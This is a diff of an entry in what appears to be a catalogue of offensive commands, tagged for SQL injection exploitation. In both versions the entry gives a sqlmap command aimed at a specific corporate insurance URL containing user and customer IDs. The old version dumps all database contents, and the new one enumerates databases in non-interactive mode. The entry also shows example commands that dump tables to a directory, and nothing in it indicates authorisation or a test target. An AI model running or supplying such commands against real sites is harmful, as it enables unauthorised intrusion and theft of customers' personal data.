@@ -1,9 +1,9 @@
 ---
-id: cmd-sqlmap-dump-001
+id: cmd-001
 data: >-
-  sqlmap -u
+  python sqlmap.py -u
   "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0"
-  --dbs --dump
+  --batch --dbs
 tags:
   - sqli
   - exploitation
@@ -15,7 +15,7 @@ platforms:
   - Windows
   - macOS
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:15:05.277Z'
+updated_at: '2025-12-14T17:26:27.830Z'
 verified: false
 validated: true
 submitted: true
@@ -25,38 +25,38 @@ submitted: true
 ## Command
 
 ```bash
-sqlmap -u "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0" --dbs --dump
+python sqlmap.py -u "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0" --batch --dbs
 ```
 
 ## Description
 
-This command uses SQLmap to target a URL with a marked injection point (*), enumerating databases (--dbs) and dumping all contents (--dump) for exploitation of SQL injection vulnerabilities.
+This command invokes SQLmap to test and exploit SQL injection in the specified URL, marking the customerId parameter with * for the injection point, then enumerates databases in batch mode without prompts.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
 | `-u` | Target URL with injection point marked by * | Yes |
-| `--dbs` | Enumerate available databases | No |
-| `--dump` | Dump database tables and data | Yes |
+| `--batch` | Non-interactive mode | No |
+| `--dbs` | Enumerate database names | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-sqlmap -u "https://example.com/path/id*" --dbs
+python sqlmap.py -u "https://target.com/path/{id*}" --dbs
 ```
 
 ### Advanced Usage
 
 ```bash
-sqlmap -u "https://example.com/path/id*" --dbs --dump -T users --columns --dump
+python sqlmap.py -u "https://target.com/path/{id*}" -D db_name --tables --dump --output-dir=/dumps/
 ```
 
 ## Expected Output
 
-SQLmap payloads test the injection, then output: available databases, table lists, and CSV/JSON dumps of data. Errors if no injection or blocked.
+SQLmap will output vulnerability confirmation, DBMS type (e.g., MySQL), and a list of accessible databases. Successful runs produce dump files in the current directory.
 
 ## Related
 
